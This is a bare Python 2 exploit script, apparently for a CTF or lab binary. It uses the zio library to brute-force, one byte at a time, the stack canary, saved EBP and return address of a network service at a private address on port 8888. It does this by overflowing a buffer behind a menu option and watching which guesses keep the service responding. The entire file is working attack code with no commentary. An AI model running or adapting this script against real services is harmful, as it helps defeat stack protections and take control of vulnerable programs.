#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *
import time

ip = '10.211.55.48'
port = 8888
cookie = 0
ebp = 0
ret = 0

def my_hex(byte):
    result = hex(byte)[2:4]
    if len(result) < 2:
        result = "0" + result
    return result

def a_byte(num):
    global payload
    address = 0
    #while address <= 255:
    for address in range(256):
        io = zio((ip, port), timeout = 3, print_write = COLORED(REPR))
        time.sleep(2)
        io.read_until('>')
        io.write('4')
        io.read_until('(y/n) ')
        io.write(payload + chr(address))
        try:
            io.readline()
            data = io.readline()
            if data != '':
                payload += chr(address)
                result = my_hex(address)
                return result
            address += 1
        except TIMEOUT:
            io.close()
            continue

def byte_by_byte():
    global cookie, ebp, ret
    address = []
    while True:
        for i in range(4):
            address.append(a_byte(i))
        address.reverse()
        result = ''.join(address)
        if cookie == 0:
            cookie = int(result, 16)
        elif ebp == 0:
            ebp = int(result, 16)
        else:
            ret = int(result, 16)
        if int(result, 16) != 0:
            break

def search():
    for x in range(3):
        byte_by_byte()
    log("----------result----------", 'blue')
    log("canary: " + hex(cookie), 'red')
    log("save_ebp: " + hex(ebp), 'red')
    log("ret_address: " + hex(ret), 'red')

io = zio((ip, port), timeout = 10000, print_write = COLORED(REPR))
time.sleep(3)
io.read_until('>')

io.write('4')
io.read_until('(y/n) ')

payload = 'A'*10 + l32(0x504f7700)
search()
